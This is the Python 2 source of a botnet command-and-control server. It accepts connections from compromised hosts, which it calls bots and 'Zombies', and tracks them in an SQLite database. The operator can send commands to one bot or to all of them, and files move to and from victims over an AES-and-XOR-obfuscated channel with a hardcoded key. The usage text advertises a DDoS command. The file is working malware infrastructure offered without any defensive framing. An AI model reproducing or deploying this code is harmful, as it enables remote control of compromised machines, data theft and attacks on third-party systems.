import os
import time
import socket
import base64
import sqlite3
import threading
from Queue import Queue
from termcolor import colored
from Crypto.Cipher import XOR, AES
from Crypto.Hash import SHA256


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2, ]
queue = Queue()

all_connections = []
all_addresses = []

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class ConnectionHandler:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port = 44353

    def socket_bind(self):
        try:
            sock.bind((self.host, self.port))
            sock.listen(10000)
        except socket.error as error:
            print "[!]Error: " + str(error)
            time.sleep(5)
            self.socket_bind()

    def register(self, ip):
        try:
            con = sqlite3.connect('bots.sqlite')
            cur = con.cursor()
            cur.execute("INSERT OR IGNORE INTO bot_info (ip) VALUES (?);",  (str(ip)))
            con.commit()
            con.close()
        except sqlite3.Error, e:
            print e
            print "\n[-]SQLError while adding Bot %s to Database!" % (str(ip))

    def accept_connections(self):
        for c in all_connections:
            c.close()
        del all_connections[:]
        del all_addresses[:]
        while True:
            try:
                conn, address = sock.accept()
                conn.setblocking(1)
                all_connections.append(conn)
                all_addresses.append(address[0])
                self.register(str(address[0]))
            except socket.error:
                print '[!]Error while accepting Connection!'


class FileHandler:
    def upload(self, filename, conn):
        time.sleep(0.5)
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                bytesToSend = f.read(1024)
                Console().send(bytesToSend, conn)
                while bytesToSend:
                    bytesToSend = f.read(1024)
                    Console().send(bytesToSend, conn)
        Console().send("EOF", conn)

    def download(self, filename, conn):
        data = Console().receive(conn)
        f = open(filename, 'wb')
        f.write(data)
        while data:
            data = Console().receive(conn)
            if data == "EOF":
                break
            else:
                f.write(data)
        f.close()
        return None


class EncryptionHandler:
    def __init__(self):
        self.pswd = "\x1f\xbf\x9fV\x1c'\xe7\xbf\xddo\x1e@@\xe7l\xce\xed\xc0\x12\xd4\xed\xdbNZ!\xd9\xb3\x81|\xa4\xe7"
        self.padding = "{"

    def _key(self):
        key = SHA256.new(self.pswd)
        key = key.digest()
        return key

    def _pad(self, data):
        length = len(data)
        to_pad = 0
        while length % 16:
            to_pad += 1
            length += 1
        return data + (self.padding * to_pad)

    def _unpad(self, data):
        data = data.strip(self.padding)
        return data

    def encrypt(self, data):
        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
        data = self._pad(data)
        data = cipher.encrypt(data)
        cipher = XOR.new(self._key())
        data = cipher.encrypt(data)
        data = base64.b64encode(data)
        return data

    def decrypt(self, data):
        cipher = XOR.new(self._key())
        data = base64.b64decode(data)
        data = cipher.decrypt(data)
        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
        data = cipher.decrypt(data)
        data = self._unpad(data)
        return data


class Console:
    def usage(self):
        usage = "\n\thelp\t\t\t\t\tShows this message\n\tlist\t\t\t\t\tLists all registered Bots\n\tselect <id>\t\t\t\tSelect a Bot by ID for single session\n\tddos <target> <type>\tDDoS specified target\n"
        return usage

    def list_connections(self):
        con = sqlite3.connect('bots.sqlite')
        cur = con.cursor()
        cur.execute("SELECT * FROM bot_info")
        bot_info = cur.fetchall()
        print "\n ID  |   ADDRESS   | STATUS \n"
        for row in bot_info:
            if row[1] in all_addresses:
                status = colored("ONLINE", "green")
                print " [%i]   %s   [%s]" % (row[0], row[1], status)
            else:
                status = colored("OFFLINE", "red")
                print " [%i]   %s   [%s]" % (row[0], row[1], status)
        con.close()
        print "\n"

    def get_target(self, target):
        try:
            target = int(target)
            con = sqlite3.connect('bots.sqlite')
            cur = con.cursor()
            cur.execute("SELECT ip FROM bot_info WHERE id = ?", (target, ))
            ip = cur.fetchall()
            ip = str(ip[0]).translate(None, "(u',)")
            target_location = all_addresses.index(str(ip))
            conn = all_connections[target_location]
            print "Connected to Bot: %s!" % (str(ip))
            con.close()
            return conn
        except:
            print "[!]Error: Invalid selection!"
            return None

    def send(self, data, conn):
        try:
            data = EncryptionHandler().encrypt(str(data))
            conn.send(data)
            return None
        except socket.error as e:
            print e
            print "[!]Error while sending command to Bot!"

    def receive(self, conn):
        try:
            data = conn.recv(65520)
            data = EncryptionHandler().decrypt(str(data))
            return data
        except socket.error as e:
            print e
            print "[!]Error while receiving data from Bot!"

    def send_target_commands(self, conn):
        while True:
            try:
                cmd = raw_input(":: ")
                cmd = cmd.split(" ")
                if cmd[0] == 'upload':
                    print cmd
                    if len(cmd[1]) > 0:
                        cmd = " ".join(cmd)
                        self.send(cmd, conn)
                        cmd = cmd.split(" ")
                        FileHandler().upload(str(cmd[1]), conn)
                        print "Upload Complete!\n"
                    else:
                        print self.usage()
                elif cmd[0] == 'download':
                    if len(cmd[1]) > 0:
                        cmd = " ".join(cmd)
                        self.send(cmd, conn)
                        cmd = cmd.split(" ")
                        FileHandler().download(str(cmd[1]), conn)
                        print "Download Complete!\n"
                    else:
                        print self.usage()
                elif cmd[0] == ('start' or 'Start'):
                    cmd = " ".join(cmd)
                    self.send(cmd, conn)
                elif len(cmd[0]) > 0:
                    cmd = " ".join(cmd)
                    self.send(cmd, conn)
                    response = self.receive(conn)
                    print response
                else:
                    print "[!]Error: None Type Object is not a command!"
                    break
            except socket.error as error:
                print "[!]Error: " + str(error)
                self.shell()

    def shell(self):
        while True:
            cmd = raw_input(":: ")
            cmd = cmd.split(" ")
            if cmd[0] == 'list':
                self.list_connections()
            elif cmd[0] == 'help':
                print self.usage()
            elif cmd[0] == 'select':
                conn = self.get_target(cmd[1])
                if conn is not None:
                    self.send_target_commands(conn)
            else:
                if cmd == 'exit':
                    for c in all_connections:
                        self.send('exit', c)
                    exit()
                elif cmd[0] == 'upload':
                    ThreadHandler().add_to_threads(FileHandler().upload, cmd[1])
                else:
                    choice = raw_input("Send Command to all Zombies?[Y/N]:: ")
                    if choice == ('y' or 'Y'):
                        for c in all_connections:
                            self.send(cmd, c)
                            print "Sent Command!\n"
                    else:
                        pass


class ThreadHandler:
    def add_to_threads(self, target, args):
        t = threading.Thread(target=target, args=args)
        t.daemon = True
        print "started thread"
        t.start()

    def create_workers(self):
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = queue.get()
            if x == 1:
                ConnectionHandler().socket_bind()
                ConnectionHandler().accept_connections()
            if x == 2:
                Console().shell()
            queue.task_done()

    def create_jobs(self):
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()

    def run(self):
        self.create_workers()
        self.create_jobs()


def create_db():
    if not os.path.isfile("bots.sqlite"):
        open("bots.sqlite", "w")
        con = sqlite3.connect('bots.sqlite')
        cur = con.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text unique)")
        con.commit()
        con.close()
    else:
        con = sqlite3.connect('bots.sqlite')
        cur = con.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text unique)")
        con.commit()
        con.close()
create_db()


if __name__ == '__main__':
    ThreadHandler().run()
